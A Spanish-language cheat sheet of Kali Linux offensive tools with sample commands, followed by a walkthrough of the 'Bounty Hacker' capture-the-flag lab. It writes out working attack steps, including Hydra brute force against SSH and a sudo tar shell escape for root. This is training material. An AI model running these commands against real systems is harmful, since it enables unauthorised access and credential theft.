Scripts Útiles

A continuación se muestran algunos ejemplos de scripts útiles en Kali Linux:

sqlmap

sqlmap es un potente script para automatizar la detección y explotación de vulnerabilidades SQL injection en aplicaciones web.

Ejemplo de uso:

sqlmap -u "http://example.com/login.php" --data="username=admin&password=123" --dbs

Metasploit

Metasploit es una plataforma de pruebas de penetración que incluye una gran cantidad de módulos y scripts para explotar vulnerabilidades en sistemas.

Ejemplo de uso:

msfconsole

Nmap

Nmap es una herramienta de escaneo de puertos y mapeo de redes que permite descubrir hosts y servicios en una red informática.

Ejemplo de uso:

nmap -p 1-65535 -sV -sS -T4 target

Hydra

Hydra es una herramienta de fuerza bruta que permite realizar ataques de login contra distintos servicios.

Ejemplo de uso:

hydra -l admin -P password.txt ftp://example.com

Wireshark

Wireshark es un analizador de protocolos de red que captura y muestra los paquetes transmitidos en una red.

Ejemplo de uso:

wireshark

Aircrack-ng

Aircrack-ng es una suite de herramientas para auditoría de seguridad de redes inalámbricas.

Ejemplo de uso:

aircrack-ng -w wordlist.txt captura-01.cap

John the Ripper

John the Ripper es un potente programa de auditoría de contraseñas que puede realizar ataques de fuerza bruta y diccionario.

Ejemplo de uso:

john --wordlist=wordlist.txt hashes.txt

Hashcat

Hashcat es una herramienta avanzada de recuperación de contraseñas que admite múltiples algoritmos de hash y métodos de ataque.

Ejemplo de uso:

hashcat -a 0 -m 0 hashes.txt wordlist.txt

Nikto

Nikto es un escáner de vulnerabilidades web que puede identificar diversos problemas de seguridad en servidores web.

Ejemplo de uso:

nikto -h http://example.com

Burp Suite

Burp Suite es una suite de herramientas de prueba de seguridad que incluye un proxy HTTP, un escáner de vulnerabilidades y otras funciones.

Ejemplo de uso:

java -jar burpsuite_community.jar

BeEF

BeEF (The Browser Exploitation Framework) es un framework de explotación de navegadores que permite controlar navegadores web de manera remota.

Ejemplo de uso:

beef-xss

Veil-Evasion

Veil-Evasion es una herramienta de generación de payloads que permite evadir la detección de antivirus.

Ejemplo de uso:

veil-evasion

ExploitDB

ExploitDB es una base de datos de exploits que contiene exploits públicamente disponibles para una amplia variedad de vulnerabilidades.

Ejemplo de uso:

searchsploit apache 2.4.7

SET (Social Engineering Toolkit)

SET es una suite de herramientas para realizar ataques de ingeniería social, como phishing, captura de credenciales y más.

Ejemplo de uso:

setoolkit

THC-Hydra

THC-Hydra es una herramienta de fuerza bruta que puede realizar ataques de login contra varios servicios, incluyendo SSH, FTP, HTTP y más.

Ejemplo de uso:

hydra -l admin -P password.txt ftp://example.com

LinEnum

LinEnum es un script de enumeración de Linux que recopila información sobre el sistema para identificar posibles puntos de explotación.

Ejemplo de uso:

./LinEnum.sh

PowerSploit

PowerSploit es una colección de scripts de PowerShell que pueden utilizarse para realizar pruebas de penetración en sistemas Windows.

Ejemplo de uso:

Import-Module PowerSploit; Invoke-AllChecks

Evil-WinRM

Evil-WinRM es una herramienta de post-explotación para sistemas Windows que permite controlar sistemas de manera remota utilizando WinRM.

Ejemplo de uso:

evil-winrm -i target -u username -p password

BloodHound

BloodHound es una herramienta de análisis de relaciones que puede identificar posibles rutas de ataque en entornos de Active Directory.

Ejemplo de uso:

bloodhound

CrackMapExec

CrackMapExec es una herramienta de post-explotación que permite realizar diversas operaciones en sistemas Windows y Active Directory.

Ejemplo de uso:

crackmapexec smb target -u username -p password

Bounty Hacker

Paso 1: Escaneo inicial

Identificar la dirección IP de la máquina víctima:

ping <IP>

Este comando envía un paquete de prueba a la dirección IP especificada y espera una respuesta. Nos ayuda a verificar la conectividad y la disponibilidad de la máquina.

Paso 2: Enumeración y acceso inicial

Exploración del servicio HTTP (puerto 80):

curl http://<IP>

Curl es una herramienta de línea de comandos que se utiliza para transferir datos desde o hacia un servidor. En este caso, lo utilizamos para acceder al servicio web HTTP y obtener información sobre la página.

Acceso al servicio FTP (puerto 21):

ftp <IP>

Este comando inicia una sesión FTP con la máquina remota. Nos permite conectarnos al servicio FTP y explorar archivos en el servidor.

Paso 3: Obtención de información y credenciales

Exfiltración de archivos desde el servicio FTP:

get logs.txt
get task.txt

Estos comandos descargan los archivos logs.txt y task.txt desde el servidor FTP a nuestra máquina local.

Análisis de archivos descargados:

Utiliza cat o un editor de texto para revisar los archivos descargados y extraer información relevante, como posibles contraseñas o pistas.

Paso 4: Explotación de credenciales

Fuerza bruta contra SSH (puerto 22):

hydra -l link -P logs.txt ssh://<IP>

hydra: Esta es una herramienta de fuerza bruta que puede realizar ataques contra varios servicios, como SSH, FTP, etc.

-l link: Especifica el nombre de usuario a utilizar en el ataque de fuerza bruta.

-P logs.txt: Especifica el archivo que contiene la lista de contraseñas que se probarán en el ataque.

Paso 5: Escalada de privilegios

Revisión de permisos Sudo:

sudo -l

Este comando muestra los privilegios sudo asignados al usuario actual en la máquina remota. Nos ayuda a identificar si tenemos permisos especiales que pueden ser explotados para obtener acceso de root.

Explotación de binario Sudo:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

sudo tar: Utilizamos tar con el permiso sudo para crear un archivo tar vacío.

--checkpoint=1: Esta opción le indica a tar que ejecute el comando especificado después de cada archivo archivado.

--checkpoint-action=exec=/bin/sh: Esta opción ejecuta /bin/sh (una shell) después de cada archivo archivado, proporcionándonos acceso a una shell interactiva con privilegios de root.

Paso 6: Recolección de flags

Recuperación de la flag de usuario y root:

Utiliza cat u otro comando para leer y recuperar el contenido de las flags.
